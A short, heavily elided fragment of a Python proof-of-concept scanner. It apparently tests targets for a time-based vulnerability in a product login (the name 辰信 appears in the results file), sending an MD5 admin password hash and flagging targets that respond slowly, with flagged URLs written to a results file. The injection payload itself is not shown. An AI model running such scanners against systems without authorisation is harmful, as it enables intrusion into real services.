...
def poc(target):
    ...
    data = {"captcha": '', "password": "21232f297a57a5a743894a0e4a801fc3",
    ...
    try:
        ...
        if res.status_code == 200 and res.elapsed.total_seconds() >= 4.5:
            print(f'[+]该url{target}存在漏洞')
            with open('辰信_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
